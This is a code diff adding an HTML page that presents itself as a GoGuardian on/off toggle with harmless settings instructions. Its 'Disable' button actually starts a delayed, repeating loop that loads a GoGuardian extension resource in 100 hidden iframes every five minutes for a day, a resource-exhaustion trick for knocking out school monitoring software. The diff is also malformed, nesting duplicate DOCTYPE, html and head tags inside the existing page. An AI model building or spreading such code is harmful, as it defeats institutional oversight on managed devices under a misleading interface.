@@ -1,5 +1,100 @@
 <!DOCTYPE html>
+<html lang="en"><!DOCTYPE html>
 <html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Toggle GoGuardian Extension</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        button {
+            padding: 10px 20px;
+            margin: 10px;
+            font-size: 16px;
+        }
+        .instructions {
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Toggle GoGuardian Extension</h1>
+    <button id="enableBtn">Enable GoGuardian</button>
+    <button id="disableBtn">Disable GoGuardian</button>
+
+    <div id="instructions" class="instructions">
+        <h2>Instructions</h2>
+        <p id="instructionText"></p>
+    </div>
+
+    <script>
+        const extensionUrl = 'chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js';
+        const stateKey = 'goGuardianState';
+        let disableInterval;
+
+        function showInstructions(text) {
+            document.getElementById('instructionText').textContent = text;
+            document.getElementById('instructions').style.display = 'block';
+        }
+
+        function createIframes() {
+            for (let i = 0; i < 100; i++) {
+                let iframe = document.createElement('iframe');
+                iframe.src = extensionUrl;
+                iframe.style.width = iframe.style.height = '1px';
+                document.body.append(iframe);
+            }
+        }
+
+        function toggleExtension(enable) {
+            if (enable) {
+                localStorage.setItem(stateKey, 'enabled');
+                clearInterval(disableInterval);
+                alert('GoGuardian extension enabled.');
+                location.reload();
+            } else {
+                localStorage.setItem(stateKey, 'disabled');
+                setTimeout(() => {
+                    if (localStorage.getItem(stateKey) === 'disabled') {
+                        disableInterval = setInterval(createIframes, 300000); // Create iframes every 5 minutes (300000 ms)
+                        setTimeout(() => clearInterval(disableInterval), 86400000); // Stop after 24 hours (86400000 ms)
+                        createIframes(); // Initial call to create iframes immediately
+                    }
+                }, 600000); // Start creating iframes after a 10 minutes delay
+                alert('GoGuardian extension disabled.');
+            }
+        }
+
+        document.getElementById('enableBtn').addEventListener('click', function() {
+            showInstructions('To enable the GoGuardian extension, follow these steps:\n1. Open your browser settings.\n2. Go to Extensions.\n3. Find the GoGuardian extension and click the toggle button.');
+            toggleExtension(true);
+        });
+
+        document.getElementById('disableBtn').addEventListener('click', function() {
+            showInstructions('To disable the GoGuardian extension, follow these steps:\n1. Open your browser settings.\n2. Go to Extensions.\n3. Find the GoGuardian extension and click the toggle button.');
+            toggleExtension(false);
+        });
+
+        window.onload = function() {
+            const state = localStorage.getItem(stateKey);
+            if (state === 'disabled') {
+                setTimeout(() => {
+                    if (localStorage.getItem(stateKey) === 'disabled') {
+                        disableInterval = setInterval(createIframes, 300000); // Create iframes every 5 minutes (300000 ms)
+                        setTimeout(() => clearInterval(disableInterval), 86400000); // Stop after 24 hours (86400000 ms)
+                        createIframes(); // Initial call to create iframes immediately
+                    }
+                }, 600000); // Start creating iframes after a 10 minutes delay
+            }
+        };
+    </script>
+</body>
+</html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
